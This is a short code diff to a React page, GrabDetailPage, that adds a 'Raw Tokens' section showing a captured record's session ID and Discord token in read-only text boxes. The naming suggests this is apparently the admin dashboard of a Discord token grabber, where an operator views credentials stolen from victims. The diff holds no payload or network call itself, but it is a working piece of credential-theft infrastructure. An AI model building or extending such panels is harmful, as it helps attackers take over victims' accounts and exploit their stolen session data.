@@ -319,6 +319,16 @@ export default function GrabDetailPage() {
             </div>
           </GrabSection>
         )}
+
+        <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: 16, marginBottom: 24, marginTop: 16 }}>
+          <GrabSection title="Raw Tokens" icon="🔑">
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>Session ID</div>
+            <textarea readOnly value={grab.session_id || '—'} style={{ width: '100%', height: 80, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: 12, color: colors.text, fontSize: 12, outline: 'none', resize: 'vertical', marginBottom: 16, fontFamily: 'monospace' }} />
+            
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>Discord Token</div>
+            <textarea readOnly value={grab.discord_token || '—'} style={{ width: '100%', height: 80, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: 12, color: colors.text, fontSize: 12, outline: 'none', resize: 'vertical', fontFamily: 'monospace' }} />
+          </GrabSection>
+        </div>
       </div>
     </div>
   );
